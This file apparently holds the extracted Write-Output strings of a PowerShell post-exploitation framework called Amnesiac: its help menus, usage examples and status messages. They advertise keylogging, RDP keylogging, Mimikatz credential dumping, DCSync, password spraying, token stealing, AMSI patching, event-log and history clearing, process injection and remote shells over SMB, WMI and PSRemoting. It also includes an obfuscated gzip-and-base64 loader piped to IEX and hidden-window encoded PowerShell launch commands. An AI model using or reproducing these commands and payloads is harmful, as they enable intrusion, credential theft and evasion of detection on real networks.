"Write-Output ""    Access_Check -Method PSRemoting -Command `"
"Write-Output ""    Access_Check -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Access_Check -Method PSRemoting -Targets `"
"Write-Output ""    Access_Check -Method PSRemoting"
"Write-Output ""    Access_Check -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Access_Check -Method SMB -Targets `"
"Write-Output ""    Access_Check -Method SMB"
"Write-Output ""    Do not run as local user (e.g.: nt authority\system) unless you specify credentials (WMI only)"
"Write-Output ""    Do not set $computerNameOnly as target if using WMI."
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting -UserName `"
"Write-Output ""    Find-LocalAdminAccess -Method PSRemoting"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method SMB -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method SMB"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami' -NoOutput"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Command 'whoami'"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -InLine"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -Targets `"
"Write-Output ""    Find-LocalAdminAccess -Method WMI -UserName `"
"Write-Output ""    Find-LocalAdminAccess -Method WMI"
"Write-Output ""    Invoke-Command -ComputerName Server01.ferrari.local -ScriptBlock {whoami}"
"Write-Output ""    Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"
"Write-Output ""    Invoke-DCSync -Hashcat"
"Write-Output ""    Invoke-DCSync"
"Write-Output ""    Invoke-PassSpray                             Spray an empty password across the Domain"
"Write-Output ""    Invoke-PassSpray -Password P@ssw0rd!         Spray a password across the Domain"
"Write-Output ""    Invoke-PassSpray -Password P@ssw0rd! -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Invoke-SMBRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin -FailSafe"
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin -UserName 'ferrari\Administrator' -Password 'P@ssw0rd!'"
"Write-Output ""    Invoke-SessionHunter -CheckAsAdmin"
"Write-Output ""    Invoke-SessionHunter -Domain ferrari.local -DomainController DC01.ferrari.local"
"Write-Output ""    Invoke-SessionHunter"
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username '.\Administrator' -Password 'P@ssw0rd!'"
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all' -Username 'ferrari\Administrator' -Password 'P@ssw0rd!'"
"Write-Output ""    Invoke-WMIRemoting -ComputerName Server01.ferrari.local -Command 'whoami /all'"
"Write-Output ""    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting"
"Write-Output ""    Token-Impersonation -MakeToken -Username `"
"Write-Output ""    Token-Impersonation -Rev2Self"
"Write-Output ""    Token-Impersonation -Steal -ProcessID 5380"
"Write-Output ""    Validate-Credentials -UserName Senna -Domain ferrari.local                          Test Empty Password"
"Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1                         Test Credentials"
"Write-Output ""    Validate-Credentials -UserName Senna -Password FuerteCorre1 -Domain ferrari.local   Specify Domain"
"Write-Output ""    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting"
"Write-Output ""    shell_psadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
"Write-Output ""    shell_psadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
"Write-Output ""    shell_psadmin -Targets `"
"Write-Output ""    shell_psadmin -Username `"
"Write-Output ""    shell_smbadmin                                 Get a shell on targets where the current user is local admin (SMB)"
"Write-Output ""    shell_smbadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
"Write-Output ""    shell_smbadmin -Targets `"
"Write-Output ""    shell_tknadmin                                  Get a shell on targets where the current user is local admin (PSRemoting)"
"Write-Output ""    shell_tknadmin -Domain _ -DomainController _    Specify a target Domain and Domain Controller"
"Write-Output ""    shell_tknadmin -Targets `"
"Write-Output ""    shell_wmiadmin                                 Get a shell on targets where the current user is local admin (WMI)"
"Write-Output ""    shell_wmiadmin -Domain _ -DomainController _   Specify a target Domain and Domain Controller"
"Write-Output ""    shell_wmiadmin -Targets `"
"Write-Output ""    shell_wmiadmin -Username `"
"Write-Output "" $PwshRawClientScript"
"Write-Output "" $PwshRawServerScript"
"Write-Output "" $UDT"
"Write-Output "" AV                 Check local AV"
"Write-Output "" Admin Sessions:"
"Write-Output "" Ask4Creds          Prompt User for Credentials"
"Write-Output "" AutoMimi           Load Katz and dump"
"Write-Output "" Available Commands:"
"Write-Output "" Available Options:"
"Write-Output "" Bookmarks:"
"Write-Output "" ClearHistory       Clear History for Current User"
"Write-Output "" ClearLogs          Clear Logs from Event Viewer"
"Write-Output "" Clipboard          Get the clipboard (text)"
"Write-Output "" CredMan            CredManager Dump"
"Write-Output "" CredValidate       Validate Domain Credentials"
"Write-Output "" DCSync             Performs DCSync"
"Write-Output "" Download           Download file from remote system [file name]"
"Write-Output "" Dpapi              Retrieve credentials protected by DPAPI"
"Write-Output "" Exit               Background the current session"
"Write-Output "" Find-LocalAdminAccess    Switch between SMB and PSRemoting"
"Write-Output "" GLSet <>           Set Global-Listener Pipe Name"
"Write-Output "" GLSet <string>           Set Global-Listener Pipe Name"
"Write-Output "" GListener          Print Global-Listener Payload"
"Write-Output "" GetSystem          Get a System Shell [New Session]"
"Write-Output "" Global-Listener Sessions:"
"Write-Output "" HashGrab           Attempt to retrieve the Hash of the current user"
"Write-Output "" Help               Help menu"
"Write-Output "" History            Get pwsh history for all users"
"Write-Output "" Hive               HiveDump"
"Write-Output "" Impersonation      Token Impersonation | Make or Steal a Token"
"Write-Output "" Kerb               Kerb TGTs Dump"
"Write-Output "" Keylog             Start Keylogger"
"Write-Output "" KeylogRead         Read Keylog output"
"Write-Output "" Kill               Terminate the current session"
"Write-Output "" LocalAdminAccess   Check Targets for Local Admin Access"
"Write-Output "" Migrate <pid>      Inject payload into specified pid [New Session]"
"Write-Output "" Migrate2 <pid>     Different migration syntax [In case the above fails]"
"Write-Output "" Mimi               Load Katz"
"Write-Output "" Monitor            Monitor Cache for TGTs"
"Write-Output "" MonitorClear       Clear TGTs from Monitor activity"
"Write-Output "" MonitorRead        Retrieve TGTs from Monitor activity"
"Write-Output "" Net                Netstat Command"
"Write-Output "" OneIsNone          Get a Backup Shell"
"Write-Output "" PInject            Load ProcessInjection"
"Write-Output "" PassSpray          Domain Password Spray"
"Write-Output "" Patch              Patch 4MZI"
"Write-Output "" PatchNet           Patch 4MZI .NET"
"Write-Output "" PowerView          Load PowerView"
"Write-Output "" Process            Display Running Processes"
"Write-Output "" RDPKeylog          Start RDP Keylogger"
"Write-Output "" RDPKeylogRead      Read RDP Keylog output"
"Write-Output "" Remoting           Remote Command Execution SMB|WMI|WinRM"
"Write-Output "" RepoURL                  Set Repo URL to Default"
"Write-Output "" RepoURL <URL>            Set Repo URL to specified URL"
"Write-Output "" Rubeus             Load Rubeus"
"Write-Output "" Scanning will stop in 40 seconds..."
"Write-Output "" Scramble           Rotate Global-Listener Pipe Name"
"Write-Output "" Screen4K           Take a screenshot [4K]"
"Write-Output "" ScreenShot         Take a screenshot [1080p]"
"Write-Output "" Serve                    Serve scripts from 0.0.0.0:8080"
"Write-Output "" Serve <port> <folder>    Serve scripts from specified folder and port"
"Write-Output "" Services           Display Running Services"
"Write-Output "" SessionHunter      Hunt for Active User Sessions"
"Write-Output "" Sessions           Show active Sessions"
"Write-Output "" Single Listener Sessions:"
"Write-Output "" Software           Display Installed Software"
"Write-Output "" Start-Process powershell.exe -WindowS Hidden -ArgumentList `"
"Write-Output "" Startup            Display Startup Apps"
"Write-Output "" Sync               Re-Sync Stream"
"Write-Output "" TLS                Enable TLS 1.2"
"Write-Output "" Toggle             Switch payload format [default: cmd(b64)]"
"Write-Output "" Upload             Upload file to remote system [full path]"
"Write-Output "" User-Defined Targets:"
"Write-Output "" [$index] $session"
"Write-Output "" [$index] $sessionName"
"Write-Output "" [*] Waiting for connection... [30 seconds timeout]"
"Write-Output "" [+] Core Commands:"
"Write-Output "" [+] Creating Service on Remote Target..."
"Write-Output "" [+] Domain Actions:"
"Write-Output "" [+] Downloading Scripts to $destinationFolder"
"Write-Output "" [+] Global-Listener PipeName: $global:MultiPipeName"
"Write-Output "" [+] Local Actions:"
"Write-Output "" [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]"
"Write-Output "" [+] Payload format: cmd(b64)"
"Write-Output "" [+] Payload format: cmd(raw)"
"Write-Output "" [+] Payload format: exe"
"Write-Output "" [+] Payload format: gzip"
"Write-Output "" [+] Payload format: pwsh"
"Write-Output "" [+] Payload format: pwsh(raw)"
"Write-Output "" [+] Payload saved to: $exefilelocation"
"Write-Output "" [+] Payload:"
"Write-Output "" [+] Pipe Name: $PipeName"
"Write-Output "" [+] Scripts Loading:"
"Write-Output "" [+] Service Name: $ServiceName"
"Write-Output "" [+] System Commands:"
"Write-Output "" [+] User Activity:"
"Write-Output "" [-] Please specify a Target"
"Write-Output "" [-] Please specify a target"
"Write-Output "" [0] Scan network for Admin Access"
"Write-Output "" [1] Single-Listener (single target)"
"Write-Output "" [2] Global-Listener (multiple targets)"
"Write-Output "" [3] Scan network for listening targets"
"Write-Output "" [4] Shell via Find-LocalAdminAccess"
"Write-Output "" `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
"Write-Output "" bookmark <sess.numb.>    Bookmark selected session"
"Write-Output "" bookmarks                Hide/Display Bookmarks"
"Write-Output "" cmd /c powershell -windows hidden `"
"Write-Output "" cmd /c powershell -windowst hidden `"
"Write-Output "" exit                     Quit Amnesiac"
"Write-Output "" help                     Displays this list of commands"
"Write-Output "" kill <sess.numb.>        Kill selected session"
"Write-Output "" kill all                 Kill all sessions"
"Write-Output "" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
"Write-Output "" powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
"Write-Output "" powershell.exe -ep bypass -Window Hidden -c `"
"Write-Output "" scramble                 Rotate Global-Listener Pipe Name"
"Write-Output "" sessions                 Hide/Display Active Sessions"
"Write-Output "" switch                   Switch between SMB and WMI for Admin Access Scan"
"Write-Output "" targets                  Hide/Display User-Defined Targets"
"Write-Output "" targets <Path or tgrts>  Path or `"
"Write-Output "" targets check            Check for and list only alive targets"
"Write-Output "" targets clear            Clear all User-Defined Targets"
"Write-Output "" toggle                   Switch payload format (default: b64)"
"Write-Output "" unbookmark <sess.numb.>  Remove a bookmark"
"Write-Output """";$TempNet | Select-String -Pattern "
"Write-Output """";Write-Output "
"Write-Output ""$($Result.ComputerName): Error - $($Result.Error)"
"Write-Output ""$($Result.Output.TrimEnd())"
"Write-Output ""$IP"
"Write-Output ""$line"
"Write-Output ""Error downloading '$url': $_"
"Write-Output ""Please use Method WMI or PSRemoting if you need to run as a different user"
"Write-Output ""[$($ComputerName)]: An unexpected error occurred"
"Write-Output ""[$($ComputerName)]: Connection timed out"
"Write-Output ""[$($Target)]: An unexpected error occurred"
"Write-Output ""[$($Target)]: Connection timed out"
"Write-Output ""[*] Available IP addresses:"
"Write-Output ""[*] Important:"
"Write-Output ""[+] $($Result.ComputerName)"
"Write-Output ""[+] $UserName has Local Admin access on:"
"Write-Output ""[+] Ask4Creds Loaded | Timeout: 25sec"
"Write-Output ""[+] Check Access:"
"Write-Output ""[+] Clipboard saved to $fileName"
"Write-Output ""[+] Command execution completed"
"Write-Output ""[+] Current Process [x64]:"
"Write-Output ""[+] Current Process [x86]:"
"Write-Output ""[+] Domain Password Spray | https://github.com/Leo4j/PassSpray"
"Write-Output ""[+] File downloaded to $fileName"
"Write-Output ""[+] File uploaded"
"Write-Output ""[+] Find-LocalAdminAccess Loaded | https://github.com/Leo4j/Find-LocalAdminAccess"
"Write-Output ""[+] Get a Shell:"
"Write-Output ""[+] History Cleared"
"Write-Output ""[+] History File Saved to: $fileName"
"Write-Output ""[+] Invoke-DCSync Loaded | https://github.com/vletoux/MakeMeEnterpriseAdmin"
"Write-Output ""[+] Invoke-SessionHunter Loaded | https://github.com/Leo4j/Invoke-SessionHunter"
"Write-Output ""[+] Keylog saved to $fileName"
"Write-Output ""[+] Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"Write-Output ""[+] Logs Cleared"
"Write-Output ""[+] New session established [$computerNameOnly]"
"Write-Output ""[+] Output saved to $fileName"
"Write-Output ""[+] Output saved to: $PWD\LocalAdminAccess.txt"
"Write-Output ""[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
"Write-Output ""[+] Processes sorted by Username:"
"Write-Output ""[+] RDP Keylog saved to $fileName"
"Write-Output ""[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0"
"Write-Output ""[+] Resynchronized with stream."
"Write-Output ""[+] SMBRemoting and WMIRemoting Loaded | https://github.com/Leo4j/Invoke-SMBRemoting | https://github.com/Leo4j/Invoke-WMIRemoting"
"Write-Output ""[+] Screenshot location: $fileName"
"Write-Output ""[+] Shellcode (hex):"
"Write-Output ""[+] Shortcuts:"
"Write-Output ""[+] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"Write-Output ""[+] TLS Enabled"
"Write-Output ""[+] The current user has Local Admin access on:"
"Write-Output ""[+] Token-Impersonation Loaded | https://github.com/Leo4j/Token-Impersonation"
"Write-Output ""[+] Usage:"
"Write-Output ""[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"
"Write-Output ""[-] Access Denied"
"Write-Output ""[-] Empty Clipboard"
"Write-Output ""[-] Empty Keylog"
"Write-Output ""[-] Empty RDP Keylog"
"Write-Output ""[-] Error retrieving History for user $userDir"
"Write-Output ""[-] Error retrieving screenshot"
"Write-Output ""[-] Injection Failed. Did you load the module ? [PInject]"
"Write-Output ""[-] No Access"
"Write-Output ""[-] No connection was established. Returning to previous menu..."
"Write-Output ""[-] Please provide your host IP address: -IP <YOUR-IP>"
"Write-Output ""[-] The file specified does not exist."
